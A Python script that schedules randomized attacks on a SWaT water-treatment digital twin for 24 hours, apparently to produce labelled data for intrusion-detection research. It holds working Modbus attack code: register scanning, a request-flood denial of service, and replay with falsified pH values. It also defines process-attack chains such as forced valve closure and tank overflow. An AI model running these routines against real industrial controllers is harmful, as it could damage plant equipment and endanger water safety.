#!/usr/bin/env python3
"""
attack_scheduler_24h.py
=======================
24-hour continuous randomized attack scheduler for SWaT digital twin.

Design principles:
  - Wall-clock timing throughout (time.monotonic()) — no sleep-tick drift
  - Attack params written to attack_metadata.json so physics_client._apply_attack_sensors()
    modifies MATLAB output before logging → attacks visible in CSV
  - Multi-stage chains model realistic ICS attack sequences
  - Per-type cooldowns prevent unrealistic back-to-back repetition
  - Single CSV via physics_client integrated logger (no data_logger.py)
  - Seeded RNG for reproducibility; pass --seed to repeat exact run

Usage:
    python attack_scheduler_24h.py \\
        --host 192.168.5.195 --port 1502 \\
        --output run_24h --hours 24

    # Short test run (30 min, high attack density):
    python attack_scheduler_24h.py \\
        --host 192.168.5.195 --port 1502 \\
        --output run_test --hours 0.5 --min-gap 60 --max-gap 180

    # Fixed seed for reproducibility:
    python attack_scheduler_24h.py \\
        --host 192.168.5.195 --port 1502 \\
        --output run_24h_seed42 --hours 24 --seed 42
"""

import argparse
import json
import logging
import os
import random
import subprocess
import sys
import time
import traceback
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple

sys.path.append(str(Path(__file__).parent))
from config.swat_config import ATTACK_SCENARIOS, MODBUS_CONFIG

# ─────────────────────────────────────────────────────────────────────────────
# Logging
# ─────────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler()]
)
log = logging.getLogger('Scheduler24h')


# ─────────────────────────────────────────────────────────────────────────────
# Attack profiles — duration bounds and cooldowns (all in seconds)
# ─────────────────────────────────────────────────────────────────────────────
#
# PROCESS ATTACKS  → 10–15 min, cooldown 5–10 min
# NETWORK ATTACKS  →  7–10 min, cooldown 3–5 min
#
ATTACK_PROFILES: Dict[str, Dict] = {
    # ── Temporal / process ────────────────────────────────────────────────
    'ph_manipulation': {
        'id': 11, 'name': 'pH Manipulation Attack', 'mitre': 'T0836',
        'min': 600, 'max': 900, 'cooldown': 600,
        'category': 'temporal',
    },
    'slow_ramp': {
        'id': 12, 'name': 'Slow Ramp Attack', 'mitre': 'T0832',
        'min': 600, 'max': 900, 'cooldown': 600,
        'category': 'temporal',
    },
    'membrane_damage': {
        'id': 10, 'name': 'Membrane Damage Attack', 'mitre': 'T0816',
        'min': 600, 'max': 900, 'cooldown': 900,
        'category': 'temporal',
    },
    'chemical_depletion': {
        'id': 9, 'name': 'Chemical Depletion Attack', 'mitre': 'T0809',
        'min': 600, 'max': 900, 'cooldown': 900,
        'category': 'temporal',
    },
    'tank_overflow': {
        'id': 8, 'name': 'Tank Overflow Attack', 'mitre': 'T0815',
        'min': 600, 'max': 900, 'cooldown': 900,
        'category': 'temporal',
    },
    'valve_manipulation': {
        'id': 16, 'name': 'Valve Manipulation Attack', 'mitre': 'T0836',
        'min': 600, 'max': 900, 'cooldown': 600,
        'category': 'temporal',
    },
    # ── Network ───────────────────────────────────────────────────────────
    'reconnaissance': {
        'id': 13, 'name': 'Reconnaissance Scan', 'mitre': 'T0840',
        'min': 420, 'max': 600, 'cooldown': 300,
        'category': 'network',
    },
    'dos_flood': {
        'id': 14, 'name': 'Denial of Service', 'mitre': 'T0814',
        'min': 420, 'max': 600, 'cooldown': 300,
        'category': 'network',
    },
    'replay': {
        'id': 15, 'name': 'Replay Attack', 'mitre': 'T0839',
        'min': 420, 'max': 600, 'cooldown': 300,
        'category': 'network',
    },
}

# Normal gap between attack windows (seconds)
# These are defaults — pass --min-gap / --max-gap on CLI to override.
# For short test runs (< 30 min) use: --min-gap 60 --max-gap 120
NORMAL_GAP_MIN = 120   # 2 min (reduced from 5 min so attacks fire in short runs)
NORMAL_GAP_MAX = 600   # 10 min (reduced from 20 min)

# Multi-stage chains — list of attack sequences with inter-stage gaps
# Each stage: (attack_type, gap_after_seconds)
# gap_after = 0 on last stage (no gap needed after final stage)
MULTI_STAGE_CHAINS: List[List[Tuple[str, int]]] = [
    # Chain A: Recon → Replay → pH manipulation
    [('reconnaissance', 120), ('replay', 90), ('ph_manipulation', 0)],

    # Chain B: Recon → Membrane damage (fouling undetected)
    [('reconnaissance', 180), ('membrane_damage', 0)],

    # Chain C: Valve manipulation → Tank overflow (valves closed, fill tank)
    [('valve_manipulation', 60), ('tank_overflow', 0)],

    # Chain D: Recon → Chemical depletion → Slow ramp (cover tracks with ramp)
    [('reconnaissance', 90), ('chemical_depletion', 120), ('slow_ramp', 0)],

    # Chain E: DOS → pH manipulation (distract operator with flood, then physical)
    [('dos_flood', 60), ('ph_manipulation', 0)],
]

# Probability of picking a multi-stage chain vs individual attack
CHAIN_PROBABILITY = 0.25


# ─────────────────────────────────────────────────────────────────────────────
# AttackMetadataFile  (fixes: 'w' mode, params field)
# ─────────────────────────────────────────────────────────────────────────────
class AttackMetadataFile:
    """
    JSON file IPC between scheduler and physics_client.py.
    physics_client reads this every cycle and:
      1. Stamps CSV row with ATTACK_ID / ATTACK_NAME / MITRE_ID
      2. Calls _apply_attack_sensors(sensors, label) to modify MATLAB output
         so attack values appear in CODESYS registers and CSV simultaneously.
    """

    def __init__(self, filepath: str):
        self.filepath = Path(filepath)
        self._write({'ATTACK_ID': 0, 'ATTACK_NAME': 'Normal',
                     'MITRE_ID': 'T0', 'params': {}})

    def _write(self, data: dict) -> None:
        data['timestamp'] = datetime.now().isoformat()
        # 'w' mode — creates file if missing, no FileNotFoundError
        with open(self.filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f)
            f.flush()
            f.truncate()
            os.fsync(f.fileno())

    def set_attack(self, attack_id: int, attack_name: str,
                   mitre_id: str, params: dict) -> None:
        self._write({
            'ATTACK_ID':   attack_id,
            'ATTACK_NAME': attack_name,
            'MITRE_ID':    mitre_id,
            'params':      params,
        })

    def set_normal(self) -> None:
        self._write({'ATTACK_ID': 0, 'ATTACK_NAME': 'Normal',
                     'MITRE_ID': 'T0', 'params': {}})


# ─────────────────────────────────────────────────────────────────────────────
# Inline network attack engine (recon, dos, replay via direct Modbus)
# ─────────────────────────────────────────────────────────────────────────────
class NetworkAttackEngine:
    """
    Inline network attacks — no subprocess needed, low latency start/stop.
    These attacks don't modify sensor registers so no race with MATLAB.
    """

    def __init__(self, host: str, port: int):
        self.host = host   # FIX: was incorrectly set to port
        self.port = port
        self._host = host
        self._mb = None

    def _connect(self) -> bool:
        from pymodbus.client import ModbusTcpClient
        self._mb = ModbusTcpClient(self._host, port=self.port, timeout=3)
        return self._mb.connect()

    def _disconnect(self) -> None:
        if self._mb:
            try: self._mb.close()
            except Exception: pass
            self._mb = None

    def reconnaissance(self, duration: int, params: dict) -> bool:
        if not self._connect():
            return False
        try:
            end_addr  = params.get('end_addr',  100)
            scan_rate = params.get('scan_rate', 10)
            elapsed, addr = 0, 0
            while elapsed < duration:
                for _ in range(scan_rate):
                    try: self._mb.read_holding_registers(addr % 52, count=1, slave=1)
                    except Exception: pass
                    addr += 1
                for _ in range(scan_rate // 2):
                    try: self._mb.read_coils(addr % 28, count=1, slave=1)
                    except Exception: pass
                time.sleep(1.0)
                elapsed += 1
            return True
        except Exception as e:
            log.warning(f'recon error: {e}')
            return False
        finally:
            self._disconnect()

    def dos_flood(self, duration: int, params: dict) -> bool:
        if not self._connect():
            return False
        rate = params.get('request_rate', 500)
        try:
            elapsed = 0
            while elapsed < duration:
                t0 = time.time()
                for _ in range(rate):
                    try:
                        self._mb.read_holding_registers(
                            random.randint(0, 51), count=1, slave=1)
                    except Exception: pass
                time.sleep(max(0, 1.0 - (time.time() - t0)))
                elapsed += 1
            return True
        except Exception as e:
            log.warning(f'dos error: {e}')
            return False
        finally:
            self._disconnect()

    def replay(self, duration: int, params: dict) -> bool:
        if not self._connect():
            return False
        capture_time = params.get('capture_time', 10)
        try:
            # Capture phase
            captured = []
            for _ in range(capture_time):
                snap = {}
                for addr in range(52):
                    try:
                        r = self._mb.read_holding_registers(addr, count=1, slave=1)
                        if not r.isError():
                            snap[addr] = r.registers[0]
                    except Exception: pass
                captured.append(snap)
                time.sleep(1.0)
            if not captured:
                return False
            # Modify snapshot — fake pH
            for snap in captured:
                if 4 in snap: snap[4] = 500
            # Replay phase
            for _ in range(duration - capture_time):
                snap = random.choice(captured)
                for addr, val in snap.items():
                    try: self._mb.write_register(addr, val, slave=1)
                    except Exception: pass
                time.sleep(1.0)
            return True
        except Exception as e:
            log.warning(f'replay error: {e}')
            return False
        finally:
            self._disconnect()


# ─────────────────────────────────────────────────────────────────────────────
# Parameter generators  (matching command_injection.py CLI expectations)
# ─────────────────────────────────────────────────────────────────────────────
def _random_params(rng: random.Random, attack_type: str) -> dict:
    """
    Generate randomised parameters for each attack type.
    Returned dict is written to attack_metadata.json params field AND
    used to build the command_injection.py subprocess command.
    """
    if attack_type == 'ph_manipulation':
        if rng.random() < 0.6:
            return {'target_ph': round(rng.uniform(4.8, 5.5), 2)}   # acid
        else:
            return {'target_ph': round(rng.uniform(8.7, 9.3), 2)}   # alkaline

    elif attack_type == 'slow_ramp':
        direction = rng.choice(['down', 'up'])
        start = rng.randint(700, 740)
        if direction == 'down':
            end = rng.randint(520, 580)   # below normal floor 680
        else:
            end = rng.randint(860, 920)   # above MATLAB natural ceiling 840
        return {
            'ramp_target':   'AIT_202',
            'start_value':   start,
            'end_value':     end,
            'step_size':     1,
            'step_interval': 2.0,
        }

    elif attack_type == 'membrane_damage':
        return {'target_tmp': rng.randint(500, 700)}

    elif attack_type == 'chemical_depletion':
        return {'drain_bisulfate': rng.choice([True, False])}

    elif attack_type == 'tank_overflow':
        return {'overflow_value': rng.randint(970, 1100)}

    elif attack_type == 'valve_manipulation':
        return {
            'valve_position': 0,   # force closed
            'target_valves': rng.choice([
                ['MV_101', 'MV_201', 'MV_301'],
                ['MV_101', 'MV_301'],
                ['MV_201', 'MV_302'],
            ]),
        }

    elif attack_type == 'reconnaissance':
        return {'start_addr': 0, 'end_addr': 100, 'scan_rate': 10}

    elif attack_type == 'dos_flood':
        return {'request_rate': rng.randint(400, 800)}

    elif attack_type == 'replay':
        return {'capture_time': 10}

    return {}


def _build_cmd(host: str, port: int, attack_type: str,
               duration: int, params: dict) -> List[str]:
    """
    Build command_injection.py subprocess command from params dict.
    Must match the CLI defined in command_injection.py main().
    """
    cmd = [
        sys.executable, 'attacks/command_injection.py',
        '--host', host,
        '--port', str(port),
        '--attack', attack_type,
        '--duration', str(duration),
    ]

    if attack_type == 'ph_manipulation':
        cmd += ['--target-ph', str(params['target_ph'])]

    elif attack_type == 'slow_ramp':
        cmd += [
            '--ramp-target',   str(params.get('ramp_target', 'AIT_202')),
            '--start-value',   str(params.get('start_value', 720)),
            '--end-value',     str(params.get('end_value', 860)),
            '--step-size',     str(params.get('step_size', 1)),
            '--step-interval', str(params.get('step_interval', 2.0)),
        ]

    elif attack_type == 'membrane_damage':
        cmd += ['--target-tmp', str(params.get('target_tmp', 600))]

    elif attack_type == 'chemical_depletion':
        if not params.get('drain_bisulfate', True):
            cmd.append('--no-drain-bisulfate')

    elif attack_type == 'tank_overflow':
        cmd += ['--overflow-value', str(params.get('overflow_value', 1000))]

    elif attack_type == 'valve_manipulation':
        cmd += ['--valve-position', str(params.get('valve_position', 0))]
        valves = params.get('target_valves', ['MV_101', 'MV_201', 'MV_301'])
        cmd += ['--target-valves'] + valves

    return cmd


# ─────────────────────────────────────────────────────────────────────────────
# Main Scheduler
# ─────────────────────────────────────────────────────────────────────────────
class ContinuousAttackScheduler:
    """
    24-hour continuous randomized attack scheduler.

    Execution flow per iteration:
      1. Normal window  — random 5–20 min gap, metadata = Normal
      2. Attack window  — single attack OR multi-stage chain
         a. Set metadata JSON (physics_client reads → labels CSV rows)
         b. Execute: subprocess (temporal) or inline (network)
         c. Enforce timeout with proc.communicate(timeout=duration+10)
         d. Reset metadata to Normal
      3. Repeat until total_seconds elapsed
    """

    def __init__(self,
                 plc_host:      str,
                 plc_port:      int,
                 output_dir:    str,
                 total_hours:   float = 24.0,
                 seed:          Optional[int] = None,
                 min_gap:       int = NORMAL_GAP_MIN,
                 max_gap:       int = NORMAL_GAP_MAX,
                 chain_prob:    float = CHAIN_PROBABILITY,
                 log_file:      Optional[str] = None):

        self.plc_host    = plc_host
        self.plc_port    = plc_port
        self.output_dir  = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.total_secs  = total_hours * 3600
        self.min_gap     = min_gap
        self.max_gap     = max_gap
        self.chain_prob  = chain_prob

        self.rng = random.Random(seed)
        self._seed = seed

        self.metadata_path = self.output_dir / 'attack_metadata.json'
        self.timeline_path = self.output_dir / 'attack_timeline.jsonl'
        self.exec_log_path = self.output_dir / 'scheduler_execution.log'

        self.metadata    = AttackMetadataFile(str(self.metadata_path))
        self.net_engine  = NetworkAttackEngine(plc_host, plc_port)

        # Per-type cooldown tracking: maps attack_type → wall-clock end time
        self._cooldown_until: Dict[str, float] = {}

        # Session statistics
        self._stats = {
            'total_attacks': 0,
            'attacks_by_type': {},
            'chains_executed': 0,
            'normal_seconds': 0,
            'attack_seconds': 0,
        }

        self._run_start: float = 0.0

        # Add file handler to scheduler log
        fh = logging.FileHandler(str(self.exec_log_path), encoding='utf-8')
        fh.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
        log.addHandler(fh)

    # ── Eligibility & selection ───────────────────────────────────────────

    def _eligible_attacks(self) -> List[str]:
        """Return attack types whose cooldown has expired."""
        now = time.monotonic()
        return [
            atype for atype in ATTACK_PROFILES
            if now >= self._cooldown_until.get(atype, 0)
        ]

    def _pick_single(self, eligible: List[str]) -> Optional[Dict]:
        """Pick one random attack from eligible list."""
        if not eligible:
            return None
        atype    = self.rng.choice(eligible)
        profile  = ATTACK_PROFILES[atype]
        duration = self.rng.randint(profile['min'], profile['max'])
        params   = _random_params(self.rng, atype)
        return {
            'type':     atype,
            'name':     profile['name'],
            'id':       profile['id'],
            'mitre':    profile['mitre'],
            'duration': duration,
            'params':   params,
            'category': profile['category'],
        }

    def _pick_chain(self, eligible: List[str]) -> Optional[List[Dict]]:
        """
        Pick a multi-stage chain where all stages are eligible and have
        time remaining in the run.
        """
        elapsed = time.monotonic() - self._run_start
        remaining = self.total_secs - elapsed

        valid_chains = []
        for chain in MULTI_STAGE_CHAINS:
            # All attack types in the chain must be eligible
            types = [stage[0] for stage in chain]
            if not all(t in eligible for t in types):
                continue
            # Estimated total chain time must fit
            est_time = sum(
                ATTACK_PROFILES[t]['min'] + gap
                for t, gap in chain
            )
            if est_time > remaining * 0.5:  # don't use >50% remaining on one chain
                continue
            valid_chains.append(chain)

        if not valid_chains:
            return None

        chosen_chain = self.rng.choice(valid_chains)
        stages = []
        for atype, gap_after in chosen_chain:
            profile  = ATTACK_PROFILES[atype]
            duration = self.rng.randint(profile['min'], profile['max'])
            stages.append({
                'type':      atype,
                'name':      profile['name'],
                'id':        profile['id'],
                'mitre':     profile['mitre'],
                'duration':  duration,
                'params':    _random_params(self.rng, atype),
                'category':  profile['category'],
                'gap_after': gap_after,
            })
        return stages

    # ── Execution ─────────────────────────────────────────────────────────

    def _log_timeline(self, event: dict) -> None:
        """Append one JSON line to timeline log."""
        event['wall_elapsed_min'] = round(
            (time.monotonic() - self._run_start) / 60, 2)
        with open(self.timeline_path, 'a', encoding='utf-8') as f:
            f.write(json.dumps(event) + '\n')

    def _sleep_normal(self, seconds: int, label: str = 'normal gap') -> None:
        """
        Sleep in 1-second ticks. Labels this period as Normal in metadata.
        Exits early if total run time would be exceeded.
        """
        self.metadata.set_normal()
        t0 = time.monotonic()
        while True:
            elapsed_run = time.monotonic() - self._run_start
            if elapsed_run >= self.total_secs:
                break
            slept = time.monotonic() - t0
            if slept >= seconds:
                break
            time.sleep(1.0)
        self._stats['normal_seconds'] += int(time.monotonic() - t0)
        log.debug(f'[NORMAL] {label} — {int(time.monotonic()-t0)} s')

    def _execute_single(self, event: dict) -> bool:
        """Execute one attack. Returns True if completed successfully."""
        atype    = event['type']
        duration = event['duration']
        params   = event['params']
        category = event['category']

        log.info(f'▶ ATTACK: {event["name"]}  dur={duration}s  params={params}')
        self._log_timeline({
            'event': 'attack_start', 'type': atype,
            'name': event['name'], 'duration': duration, 'params': params,
        })

        # FIX 3: start timing AFTER the 3-second propagation delay so
        # attack_seconds does not count setup overhead as attack time.
        self.metadata.set_attack(event['id'], event['name'], event['mitre'], params)
        time.sleep(3)  # propagation margin before attack starts modifying registers
        t_start = time.monotonic()
        success = False

        try:
            if category == 'network':
                method = getattr(self.net_engine, atype, None)
                if method is None:
                    log.error(f'No network handler for {atype}')
                    return False
                success = method(duration, params)

            else:  # temporal — subprocess to command_injection.py
                cmd = _build_cmd(self.plc_host, self.plc_port,
                                 atype, duration, params)
                log.info(f'  CMD: {" ".join(cmd)}')
                proc = subprocess.Popen(cmd,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
                try:
                    stdout, stderr = proc.communicate(timeout=duration + 15)
                    success = (proc.returncode == 0)
                    if not success and stderr:
                        log.error(f'  STDERR: {stderr.decode(errors="replace").strip()[:300]}')
                except subprocess.TimeoutExpired:
                    log.warning(f'  TIMEOUT: {atype} exceeded {duration}s — killing')
                    proc.kill()
                    # FIX 1: give the dead process 5 s to flush stdout/stderr.
                    # Without this timeout the communicate() call blocks indefinitely
                    # if the child is stuck inside a Modbus write (e.g. tank_overflow).
                    try:
                        proc.communicate(timeout=5)
                    except subprocess.TimeoutExpired:
                        pass   # process truly stuck — ignore remaining output
                    success = True  # data was collected for the full duration

        except Exception as e:
            log.error(f'  ERROR in {atype}: {e}')
            traceback.print_exc()
        finally:
            actual_dur = int(time.monotonic() - t_start)
            self.metadata.set_normal()
            self._stats['attack_seconds']  += actual_dur
            self._stats['total_attacks']   += 1
            self._stats['attacks_by_type'][atype] = \
                self._stats['attacks_by_type'].get(atype, 0) + 1
            # Set cooldown
            self._cooldown_until[atype] = \
                time.monotonic() + ATTACK_PROFILES[atype]['cooldown']
            log.info(f'{"✓" if success else "✗"} DONE: {event["name"]} '
                     f'(actual {actual_dur}s) — cooldown {ATTACK_PROFILES[atype]["cooldown"]}s')
            self._log_timeline({
                'event': 'attack_end', 'type': atype,
                'actual_duration': actual_dur, 'success': success,
            })

        return success

    def _execute_chain(self, stages: List[Dict]) -> None:
        """Execute a multi-stage attack chain."""
        log.info(f'⛓  CHAIN: {" → ".join(s["name"] for s in stages)}')
        self._stats['chains_executed'] += 1
        self._log_timeline({
            'event': 'chain_start',
            'stages': [s['name'] for s in stages],
        })
        for i, stage in enumerate(stages):
            elapsed_run = time.monotonic() - self._run_start
            if elapsed_run >= self.total_secs:
                break
            self._execute_single(stage)
            gap = stage.get('gap_after', 0)
            if gap > 0 and i < len(stages) - 1:
                log.info(f'  inter-stage normal gap: {gap}s')
                self._sleep_normal(gap, label=f'inter-stage gap after {stage["type"]}')

    # ── Main run loop ─────────────────────────────────────────────────────

    def run(self) -> None:
        # FIX 2: PID lockfile — prevents two scheduler instances writing to the
        # same output directory simultaneously (which corrupts attack_metadata.json
        # and produces duplicate run_start events in attack_timeline.jsonl).
        lockfile = Path(self.output_dir) / 'attack_scheduler.lock'
        if lockfile.exists():
            existing_pid = lockfile.read_text().strip()
            log.error(
                f'Lock file already exists: {lockfile}\n'
                f'  PID in lock: {existing_pid}\n'
                f'  Another scheduler instance may be running!\n'
                f'  If you are sure no other instance is running, delete the lock:\n'
                f'    del "{lockfile}"'
            )
            return
        lockfile.write_text(str(os.getpid()))
        log.info(f'[LOCK] Created scheduler lock: {lockfile} (PID {os.getpid()})')

        try:
            self._run_locked()
        finally:
            try:
                lockfile.unlink()
                log.info(f'[LOCK] Released scheduler lock: {lockfile}')
            except FileNotFoundError:
                pass

    def _run_locked(self) -> None:
        """Actual run logic, executed only when the lockfile is held."""
        self._run_start = time.monotonic()
        self.metadata.set_normal()

        log.info('=' * 70)
        log.info('SWaT 24-Hour Attack Scheduler')
        log.info(f'  Host      : {self.plc_host}:{self.plc_port}')
        log.info(f'  Duration  : {self.total_secs/3600:.1f} h')
        log.info(f'  Seed      : {self._seed}')
        log.info(f'  Output    : {self.output_dir}')
        log.info(f'  Gap range : {self.min_gap}–{self.max_gap} s')
        log.info(f'  Profiles  : {len(ATTACK_PROFILES)} attack types')
        log.info(f'  Chains    : {len(MULTI_STAGE_CHAINS)} (prob={self.chain_prob:.0%})')
        log.info('=' * 70)
        self._log_timeline({'event': 'run_start',
                            'total_hours': self.total_secs / 3600,
                            'seed': self._seed})

        # Initial normal warmup — let physics stabilise
        # Cap warmup to 10% of total run time (max 120 s) so short runs still get attacks
        warmup_s = min(120, max(30, int(self.total_secs * 0.10)))
        log.info(f'[WARMUP] {warmup_s}s normal operation before first attack '
                 f'(10% of {self.total_secs/60:.1f} min run)')
        self._sleep_normal(warmup_s, label='initial warmup')

        iteration = 0

        try:
            while True:
                elapsed_run = time.monotonic() - self._run_start
                if elapsed_run >= self.total_secs:
                    break

                iteration += 1
                remaining  = self.total_secs - elapsed_run

                # ── Normal gap ────────────────────────────────────────────
                gap = self.rng.randint(self.min_gap, self.max_gap)
                # For short runs cap gap to 20% of remaining (was 30%) so attacks fire sooner
                gap = min(gap, max(60, int(remaining * 0.2)))
                gap = max(gap, 30)                    # at least 30 s normal (was 60)

                log.info(f'[ITER {iteration}] {elapsed_run/3600:.2f}h elapsed — '
                         f'normal gap {gap}s')
                self._sleep_normal(gap, label=f'iter {iteration} gap')

                # Re-check after gap
                elapsed_run = time.monotonic() - self._run_start
                if elapsed_run >= self.total_secs:
                    break

                # ── Pick attack or chain ───────────────────────────────────
                eligible = self._eligible_attacks()
                if not eligible:
                    log.warning('All attacks on cooldown — extending normal gap 60s')
                    self._sleep_normal(60, label='cooldown extension')
                    continue

                if self.rng.random() < self.chain_prob:
                    chain = self._pick_chain(eligible)
                    if chain:
                        self._execute_chain(chain)
                        continue

                # Fall back to single attack
                event = self._pick_single(eligible)
                if event:
                    # Ensure this attack fits remaining time
                    remaining = self.total_secs - (time.monotonic() - self._run_start)
                    event['duration'] = min(event['duration'], max(60, int(remaining * 0.9)))
                    self._execute_single(event)

        except KeyboardInterrupt:
            log.info('Interrupted by user — shutting down cleanly')
        except Exception as e:
            log.error(f'Fatal scheduler error: {e}')
            traceback.print_exc()
        finally:
            self.metadata.set_normal()
            self._print_summary()

    # ── Summary ───────────────────────────────────────────────────────────

    def _print_summary(self) -> None:
        runtime = time.monotonic() - self._run_start
        s = self._stats
        log.info('=' * 70)
        log.info('SCHEDULER COMPLETE')
        log.info(f'  Runtime         : {runtime/3600:.2f} h  ({runtime:.0f} s)')
        log.info(f'  Total attacks   : {s["total_attacks"]}')
        log.info(f'  Multi-stage chains: {s["chains_executed"]}')
        log.info(f'  Attack time     : {s["attack_seconds"]/3600:.2f} h  '
                 f'({s["attack_seconds"]/max(1,runtime)*100:.1f}%)')
        log.info(f'  Normal time     : {s["normal_seconds"]/3600:.2f} h')
        log.info('  Attacks by type:')
        for atype, count in sorted(s['attacks_by_type'].items(),
                                   key=lambda x: x[1], reverse=True):
            log.info(f'    {atype:25s}: {count}')
        log.info('=' * 70)
        self._log_timeline({'event': 'run_end',
                            'runtime_hours': runtime / 3600,
                            'stats': s})


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────
def main() -> int:
    parser = argparse.ArgumentParser(
        description='SWaT 24-Hour Continuous Attack Scheduler',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full 24-hour run:
  python attack_scheduler_24h.py --host 192.168.5.195 --output run_24h --hours 24

  # 30-minute test with denser attacks:
  python attack_scheduler_24h.py --host 192.168.5.195 --output run_test \\
      --hours 0.5 --min-gap 60 --max-gap 180

  # Reproducible run:
  python attack_scheduler_24h.py --host 192.168.5.195 --output run_24h_s42 \\
      --hours 24 --seed 42

  # Start via start_system.py (recommended — manages MATLAB + bridge):
  python start_system.py --host 192.168.5.195 --port 1502 \\
      --matlab-path "C:\\path\\to\\m" --reuse-existing-matlab \\
      --output run_24h --hours 24 --attack-script attack_scheduler_24h.py
        """
    )
    parser.add_argument('--host',    default=MODBUS_CONFIG['host'])
    parser.add_argument('--port',    type=int, default=MODBUS_CONFIG['port'])
    parser.add_argument('--output',  default='run_24h', metavar='DIR')
    parser.add_argument('--hours',   type=float, default=24.0,
                        help='Total run duration in hours (default 24)')
    parser.add_argument('--seed',    type=int,   default=None,
                        help='RNG seed for reproducibility')
    parser.add_argument('--min-gap', type=int,   default=NORMAL_GAP_MIN,
                        help=f'Min normal gap seconds (default {NORMAL_GAP_MIN})')
    parser.add_argument('--max-gap', type=int,   default=NORMAL_GAP_MAX,
                        help=f'Max normal gap seconds (default {NORMAL_GAP_MAX})')
    parser.add_argument('--chain-prob', type=float, default=CHAIN_PROBABILITY,
                        help=f'Multi-stage chain probability (default {CHAIN_PROBABILITY})')
    # For compatibility with start_system.py --total / --attack flags
    parser.add_argument('--total',  type=int, default=None,
                        help='Total minutes (overrides --hours if set)')
    parser.add_argument('--attack', type=int, default=None,
                        help='(Ignored in 24h mode — attacks are random)')
    parser.add_argument('--include-attacks', default='',
                        help='(Ignored in 24h mode — all attacks always included)')

    args = parser.parse_args()

    if args.total:
        hours = args.total / 60.0
    else:
        hours = args.hours

    scheduler = ContinuousAttackScheduler(
        plc_host   = args.host,
        plc_port   = args.port,
        output_dir = args.output,
        total_hours= hours,
        seed       = args.seed,
        min_gap    = args.min_gap,
        max_gap    = args.max_gap,
        chain_prob = args.chain_prob,
    )
    scheduler.run()
    return 0


if __name__ == '__main__':
    sys.exit(main())